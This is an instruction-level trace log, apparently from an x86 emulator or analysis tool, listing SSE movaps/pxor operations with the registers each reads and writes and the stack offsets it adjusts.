[122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430032: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430036: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x43003f: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430048: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x430054: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430058: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430064: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430070: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x430088: movaps xmmword ptr [ebp - 0x60], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430098: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x4300a9: movaps xmmword ptr [ebp - 0x70], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x4300ad: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4300b1: movaps xmm2, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x4300be: movaps xmm1, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x4300d0: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4300e1: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x4300f1: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x4300f4: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4300fc: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x430100: movaps xmm7, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x430104: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x43010c: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43011e: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43012b: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x43013f: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430143: movaps xmmword ptr [ebp - 0x70], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x43014f: pxor xmm0, xmmword ptr [ebp - 0x70], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x43016a: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430172: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430176: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x430187: movaps xmmword ptr [ebp - 0xc0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x43018e: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430196: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x43019a: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43019e: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4301a5: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4301b1: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4301bd: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x4301c9: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4301cd: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4301dd: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4301e0: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4301f2: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x43023a: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x43024e: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x43025d: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430261: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430265: movaps xmmword ptr [ebp - 0x130], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430276: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x430281: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430285: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x43028d: pxor xmm5, xmmword ptr [ebp - 0x130], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x430295: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4302ab: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4302af: movaps xmm0, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x4302ba: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4302cc: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x4302db: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x4302eb: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4302f3: movaps xmm7, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x4302ff: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43030c: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430310: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430320: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x430328: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430330: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430334: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430338: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x43033f: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x430342: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x430355: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430359: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43035d: movaps xmm5, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430361: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x43037a: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430383: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4303a6: movaps xmmword ptr [ebp - 0x40], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4303de: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4303e2: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x4303fa: movaps xmmword ptr [ebp - 0x130], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430401: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43040f: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x43041a: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x43041e: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x430426: pxor xmm5, xmmword ptr [ebp - 0x130], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x43042e: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430444: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430448: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43044c: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430463: movaps xmmword ptr [ebp - 0x70], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x430467: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x430484: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x430495: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4304a2: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x4304a6: pxor xmm0, xmmword ptr [ebp - 0x30], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x4304bc: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4304c9: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4304cd: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4304dd: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4304e9: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4304f1: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x4304f8: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x4304fd: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430501: movaps xmm7, xmm1, regs_read: [123], regs_write: [129] 0x430504: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430508: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430517: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43051a: movaps xmm5, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x430534: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430540: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430549: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x430565: movaps xmmword ptr [ebp - 0x40], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430575: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x430585: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430594: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4305a0: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4305ae: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x4305b9: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4305c2: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4305c6: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4305db: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4305e7: movaps xmmword ptr [ebp - 0x30], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4305eb: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x4305ee: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430607: movaps xmm2, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x430616: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430628: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430630: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430634: movaps xmmword ptr [ebp - 0x110], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x430644: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430651: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x430659: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430661: movaps xmmword ptr [ebp - 0xb0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430668: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43066c: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x43066f: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430676: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x43068c: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430690: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x430694: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x430697: movaps xmm5, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4306b1: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4306ba: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4306c9: movaps xmmword ptr [ebp - 0x40], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430709: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430715: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x43072e: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430732: movaps xmmword ptr [ebp - 0x140], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x43073e: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x430749: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x430754: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430758: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430765: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x430769: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x43076c: pxor xmm5, xmmword ptr [ebp - 0x140], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x43077d: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x430786: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430796: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43079a: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x4307ba: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4307ce: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x4307e1: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x4307ed: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x4307f5: movaps xmm7, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x430801: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x43080e: movaps xmmword ptr [ebp - 0xb0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x430815: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430819: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x430826: mov edx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x430829: mov esi, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 0x43082c: mov ecx, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 0x43083f: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430847: movaps xmmword ptr [ebp - 0x140], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x43084e: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430852: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430859: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43085c: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x43086a: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x430871: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x430875: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430885: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x430888: mov eax, dword ptr [ebp - 0xec], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f14 for stack size 0x10000 0x43088e: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430892: mov edi, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f0c for stack size 0x10000 0x4308a6: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4308ee: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x4308fe: movaps xmm1, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x43090d: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430911: movaps xmmword ptr [ebp - 0x60], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x430915: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430928: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x430933: movaps xmmword ptr [ebp - 0x130], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x430942: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x430946: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x430953: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x430956: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x430962: pxor xmm5, xmmword ptr [ebp - 0x60], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x430970: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () 